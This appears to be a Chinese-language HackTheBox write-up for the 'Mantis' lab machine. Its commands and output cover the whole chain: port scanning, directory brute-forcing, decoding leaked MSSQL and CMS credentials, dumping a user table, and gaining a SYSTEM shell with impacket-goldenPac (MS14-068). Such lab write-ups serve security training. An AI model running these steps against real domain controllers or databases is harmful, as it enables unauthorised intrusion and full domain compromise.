---
title: HTB-Mantis Writeup
date: 2026-04-29T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - 目录爆破
  - MSSQL
  - Impacket
  - goldenPac
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ sudo nmap --min-rate 10000 -p- 10.129.26.82 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 02:37 -0400
Warning: 10.129.26.82 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.26.82
Host is up (0.15s latency).
Not shown: 65118 closed tcp ports (reset), 390 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49167/tcp open  unknown
49170/tcp open  unknown
49179/tcp open  unknown
50255/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 24.87 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49167,49170,49179,50255

```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49167,49170,49179,50255 10.129.26.82                                                                      
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 02:40 -0400
Nmap scan report for 10.129.26.82
Host is up (0.14s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-29 06:40:38Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.129.26.82:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-04-29T06:41:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-29T06:33:47
|_Not valid after:  2056-04-29T06:33:47
| ms-sql-ntlm-info: 
|   10.129.26.82:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  msrpc        Microsoft Windows RPC
49179/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2026-04-29T06:41:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-29T06:33:47
|_Not valid after:  2056-04-29T06:33:47
| ms-sql-info: 
|   10.129.26.82:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
| ms-sql-ntlm-info: 
|   10.129.26.82:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-29T06:41:38
|_  start_date: 2026-04-29T06:33:43
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2026-04-29T02:41:37-04:00
|_clock-skew: mean: 34m16s, deviation: 1h30m43s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.19 seconds

```

Nmap 的扫描结果表明这是一个域控制器，开放 8080 Web 服务和 SMB 服务。

对暴露出来的域名做 hosts 解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ sudo bash -c 'echo "10.129.26.82 htb.local mantis.htb.local" >> /etc/hosts'
                                                                                                 
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ tail -n 1 /etc/hosts
10.129.26.82 htb.local mantis.htb.local
                                       
```

## Web 渗透

打开 8080 端口，这是一个博客，使用的是 `Orchard CMS`。

初步浏览没发现显著的突破口。

![](Pasted%20image%2020260429144918.png)

## 1337 端口渗透

机器开放的 1337 端口是一个 http 端口，做一下目录爆破，发现一个目录 `secure_notes`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ gobuster dir -u http://10.129.26.82:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.26.82:1337
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
orchard              (Status: 500) [Size: 3026]
secure_notes         (Status: 301) [Size: 161] [--> http://10.129.26.82:1337/secure_notes/]
```

浏览发现一个操作记录。

```bash
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.

Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

OrchardCMS 的用户名为 `admin`，密码为二进制，尝试解密得到密码为 `@dm!n_P@ssW0rd!`。

![](Pasted%20image%2020260429153737.png)

可以用这个凭据登录进后台。

![](Pasted%20image%2020260429154334.png)

![](Pasted%20image%2020260429154414.png)

此外文件名很像 base64，尝试解密得到一个十六进制码，进一步解密得到 mssql 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d
6d2424716c5f53405f504073735730726421                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d | xxd
00000000: 3664 3234 3234 3731 3663 3566 3533 3430  6d2424716c5f5340
00000010: 3566 3530 3430 3733 3733 3537 3330 3732  5f50407373573072
00000020: 3634 3231                                6421
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d | xxd -r -p
m$$ql_S@_P@ssW0rd!
```

尝试默认账户 `sa` 失败，尝试 `admin` 成功登录进 mssql。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ impacket-mssqlclient sa:'m$$ql_S@_P@ssW0rd!'@10.129.26.95 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Windows authentication.
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ impacket-mssqlclient sa:'m$$ql_S@_P@ssW0rd!'@10.129.26.95              
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ impacket-mssqlclient admin:'m$$ql_S@_P@ssW0rd!'@10.129.26.95
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000)
[!] Press help for extra shell commands
SQL (admin  admin@master)> 

```

## Mssql 渗透

查询基本信息，和 nmap 扫描结果一致，且没有 `xp_cmdshell` 权限。

```bash
SQL (admin  admin@master)> SELECT SYSTEM_USER,SUSER_NAME(),CURRENT_USER;
                        
-----   -----   -----   
admin   admin   admin   
SQL (admin  admin@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
SQL (admin  admin@master)> SELECT @@version;
                                                                                                                                                                                                          
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2014 - 12.0.2000.8 (X64) 
        Feb 20 2014 20:04:26 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)

```

- SYSTEM_USER：当前连接 SQL Server 时使用的服务器级登录名（Login）
- SUSER_NAME：当前服务器安全上下文对应的登录名，用于确认当前实际生效的 Login
- CURRENT_USER：当前数据库中的数据用户（User）身份
- sysadmin 是 MSSQL 最强的服务器级角色，1 代表属于，0代表不属于

爆破 tables。

```bash
SQL (admin  admin@orcharddb)> SELECT table_schema,table_name FROM information_schema.tables ORDER BY table_name;                                                                                                  
table_schema   table_name                                             
------------   ----------------------------------------------------   
dbo            blog_Common_BodyPartRecord                             
dbo            blog_Common_CommonPartRecord                           
dbo            blog_Common_CommonPartVersionRecord                    
dbo            blog_Common_IdentityPartRecord                         
dbo            blog_Containers_ContainablePartRecord                  
dbo            blog_Containers_ContainerPartRecord                    
dbo            blog_Containers_ContainerWidgetPartRecord              
dbo            blog_Navigation_AdminMenuPartRecord                    
dbo            blog_Navigation_MenuPartRecord                         
dbo            blog_Orchard_Alias_ActionRecord                        
dbo            blog_Orchard_Alias_AliasRecord                         
dbo            blog_Orchard_Autoroute_AutoroutePartRecord             
dbo            blog_Orchard_Blogs_BlogArchivesPartRecord              
dbo            blog_Orchard_Blogs_BlogPartArchiveRecord               
dbo            blog_Orchard_Blogs_RecentBlogPostsPartRecord           
dbo            blog_Orchard_Comments_CommentPartRecord                
dbo            blog_Orchard_Comments_CommentsPartRecord               
dbo            blog_Orchard_ContentPicker_ContentMenuItemPartRecord   
dbo            blog_Orchard_Framework_ContentItemRecord               
dbo            blog_Orchard_Framework_ContentItemVersionRecord        
dbo            blog_Orchard_Framework_ContentTypeRecord               
dbo            blog_Orchard_Framework_CultureRecord                   
dbo            blog_Orchard_Framework_DataMigrationRecord             
dbo            blog_Orchard_Framework_DistributedLockRecord           
dbo            blog_Orchard_MediaLibrary_MediaPartRecord              
dbo            blog_Orchard_MediaProcessing_FileNameRecord            
dbo            blog_Orchard_MediaProcessing_FilterRecord              
dbo            blog_Orchard_MediaProcessing_ImageProfilePartRecord    
dbo            blog_Orchard_OutputCache_CacheParameterRecord          
dbo            blog_Orchard_Packaging_PackagingSource                 
dbo            blog_Orchard_Recipes_RecipeStepResultRecord            
dbo            blog_Orchard_Roles_PermissionRecord                    
dbo            blog_Orchard_Roles_RoleRecord                          
dbo            blog_Orchard_Roles_RolesPermissionsRecord              
dbo            blog_Orchard_Roles_UserRolesPartRecord                 
dbo            blog_Orchard_Tags_ContentTagRecord                     
dbo            blog_Orchard_Tags_TagRecord                            
dbo            blog_Orchard_Tags_TagsPartRecord                       
dbo            blog_Orchard_Taxonomies_TaxonomyPartRecord             
dbo            blog_Orchard_Taxonomies_TermContentItem                
dbo            blog_Orchard_Taxonomies_TermPartRecord                 
dbo            blog_Orchard_Taxonomies_TermsPartRecord                
dbo            blog_Orchard_Users_UserPartRecord                      
dbo            blog_Orchard_Widgets_LayerPartRecord                   
dbo            blog_Orchard_Widgets_WidgetPartRecord                  
dbo            blog_Orchard_Workflows_ActivityRecord                  
dbo            blog_Orchard_Workflows_AwaitingActivityRecord          
dbo            blog_Orchard_Workflows_TransitionRecord                
dbo            blog_Orchard_Workflows_WorkflowDefinitionRecord        
dbo            blog_Orchard_Workflows_WorkflowRecord                  
dbo            blog_Scheduling_ScheduledTaskRecord                    
dbo            blog_Settings_ContentFieldDefinitionRecord             
dbo            blog_Settings_ContentPartDefinitionRecord              
dbo            blog_Settings_ContentPartFieldDefinitionRecord         
dbo            blog_Settings_ContentTypeDefinitionRecord              
dbo            blog_Settings_ContentTypePartDefinitionRecord          
dbo            blog_Settings_ShellDescriptorRecord                    
dbo            blog_Settings_ShellFeatureRecord                       
dbo            blog_Settings_ShellFeatureStateRecord                  
dbo            blog_Settings_ShellParameterRecord                     
dbo            blog_Settings_ShellStateRecord                         
dbo            blog_Title_TitlePartRecord
```

爆破 `blog_Orchard_Users_UserPartRecord` 的 columns。

```bash
SQL (admin  admin@orcharddb)> SELECT column_name FROM information_schema.columns WHERE table_name='blog_Orchard_Users_UserPartRecord';
column_name           
-------------------   
Id                    
UserName              
Email                 
NormalizedUserName    
Password              
PasswordFormat        
HashAlgorithm         
PasswordSalt          
RegistrationStatus    
EmailStatus           
EmailChallengeToken   
CreatedUtc            
LastLoginUtc          
LastLogoutUtc
```

爆破 `blog_Orchard_Users_UserPartRecord` 中的具体敏感信息得到用户凭据 `james:J@m3s_P@ssW0rd!`。

```bash
SQL (admin  admin@orcharddb)> SELECT Id,UserName,Email,NormalizedUserName,Password,PasswordFormat,HashAlgorithm,PasswordSalt FROM blog_Orchard_Users_UserPartRecord;
Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               
--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   
 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   
15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA
```

验证 james 的 smb 权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ nxc smb 10.129.26.112 -u 'james' -d htb.local -p 'J@m3s_P@ssW0rd!'
SMB         10.129.26.112   445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.26.112   445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

执行 goldenPac 得到 administrator。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ impacket-goldenPac -dc-ip 10.129.26.112 htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[-] Couldn't get forest info ([Errno Connection error (htb.local:445)] [Errno 113] No route to host), continuing
[*] Attacking domain controller 10.129.26.112
[*] 10.129.26.112 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file tHLcxQro.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service XYoR on mantis.htb.local.....
[*] Starting service XYoR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
nt authority\system


```

